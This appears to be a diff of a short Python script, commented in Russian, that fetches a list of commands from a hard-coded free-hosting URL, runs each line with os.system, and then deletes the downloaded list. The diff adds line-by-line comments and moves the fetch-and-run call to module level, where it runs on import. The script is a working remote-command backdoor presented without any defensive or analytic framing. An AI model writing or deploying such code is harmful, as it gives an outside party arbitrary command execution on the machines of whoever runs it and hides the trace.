@@ -4,25 +4,21 @@
 кросплотформенная
 без автозапуска
 '''
-import re, os, requests
+import re, os, requests#библеотеки для работы
 
-def get_html(url):
-	r = requests.get(url)
-	list1 = open("command.listc",'w')
-	list1.write(r.text)
-	list1.close()
-	lst1 = open("command.listc")
-	return lst1.readlines()
+def get_html(url):#функцыя для скачивания листа с командами
+	r = requests.get(url)#скачивание страницы
+	list1 = open("command.listc",'w')#открытие файла для записи команд
+	list1.write(r.text)#запись страницы С командами
+	list1.close()#закрытие файла
+	lst1 = open("command.listc")#открытие файла для чтения
+	return lst1.readlines()#функция возвращает массив с строками командами
 
-def mission(stur):
-	for wew in range(0,len(stur)):
-		pattern = r"\n"
-		os.system(re.sub(pattern, "", stur[wew]))
+def mission(stur):#функция для очищения команд от спецсимволов и выполнение команд
+	for wew in range(0,len(stur)):#цикл для перебора массива С командами
+		pattern = r"\n"#спецсимвол который надо отрезать
+		os.system(re.sub(pattern, "", stur[wew]))#команда отрезания спецсимволы и выполнение системные команды
 
-def main():
-	wer = get_html('https://rstiller.000webhostapp.com/ret.yu')
-	mission(wer)
-	os.remove("command.listc")
-
-if __name__ == '__main__':
-	main()
+wer = get_html('https://rstiller.000webhostapp.com/ret.yu')#выполняем функцию в аргументы которые выдаем сайт С командами
+mission(wer)#передача массива на выполнение
+os.remove("command.listc")#удаление файла с командами
